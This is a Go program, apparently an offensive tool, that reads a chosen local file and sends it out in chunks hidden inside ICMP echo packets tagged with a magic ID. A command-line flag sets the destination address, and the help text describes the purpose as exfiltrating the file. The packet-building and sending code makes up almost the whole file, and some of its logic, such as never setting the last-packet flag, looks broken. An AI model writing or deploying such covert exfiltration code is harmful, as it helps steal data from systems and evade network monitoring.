package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"os"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const BUFFERSIZE = 512
const MAXPAYLOAD = 1472
const MAGIC = 0xA00A
const FIRSTFLAGMASK = 0x01
const LASTFLAGMASK = 0x02
const IPV4ICMP = 8

type exfil struct {
	first    bool
	last     bool
	filename string
	data     []byte
}

func initExfil() exfil {
	return exfil{false, false, "", nil}
}

func buildFlags(pak exfil) byte {
	var flags byte
	flags = 0

	if pak.first {
		flags |= FIRSTFLAGMASK
	}
	if pak.last {
		flags |= LASTFLAGMASK
	}

	return flags
}

func buildExfilPacket(pak exfil) []byte {
	offset := 0
	pakLength := len(pak.data) + 3
	if pak.first {
		pakLength += len(pak.filename) + 1
	}
	b := make([]byte, pakLength)

	// flags for exfil header
	b[offset] = buildFlags(pak)
	offset += 1

	// Special fields for first packet
	if pak.first {
		b[offset] = uint8(len(pak.filename))
		offset += 1
		copy(b[offset:offset+len(pak.filename)], []byte(pak.filename))
		offset += len(pak.filename)
	}

	// file data
	var dataLen uint16 = uint16(len(pak.data))
	binary.BigEndian.PutUint16(b[offset:offset+2], dataLen)
	offset += 2
	copy(b[offset:offset+len(pak.data)], []byte(pak.data))

	return b
}

func main() {
	var file = flag.String("f", "", "the file to exfiltrate via ICMP")
	var debug = flag.Bool("d", false, "enable debug output")
	var help = flag.Bool("h", false, "show help.")
	var host = flag.String("l", "127.0.0.1", "the location ip to send the file too")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}

	// Open the local file
	f, err := os.Open(*file)
	if err != nil {
		log.Fatalln(err)
	}
	defer f.Close()

	packet := initExfil()
	packet.first = true
	packet.filename = *file

	buf := make([]byte, BUFFERSIZE)

	var fullPak = icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: nil}
	var echoPak = icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
	var fileError error = nil
	var bytesRead int = 0
	socket, err := icmp.ListenPacket("ip4:icmp", *host)
	echoPak.ID = MAGIC
	echoPak.Seq = 0
	echoPak.Data = nil

	if *debug {
		fmt.Printf("flags bytes: %x\n", buildFlags(packet))
		fmt.Printf("(bytes)filename length: %x\n", len(*file))
		fmt.Printf("file name bytes: %x\n", *file)
	}

	for {
		bytesRead, fileError = f.Read(buf)
		if fileError == io.EOF {
			break
		}
		packet.data = buf[0:bytesRead]
		if *debug {
			fmt.Printf("(bytes)length of data: %x\n", bytesRead)
			fmt.Printf("bytes just read: %x\n", buf[0:bytesRead])
		}
		pak := buildExfilPacket(packet)
		echoPak.Data = pak
		fullPak.Body = icmp.MessageBody(&echoPak)
		b, _ := fullPak.Marshal(nil)
		socket.WriteTo(b, socket.LocalAddr())
		echoPak.Seq += 1
	}

	return
}
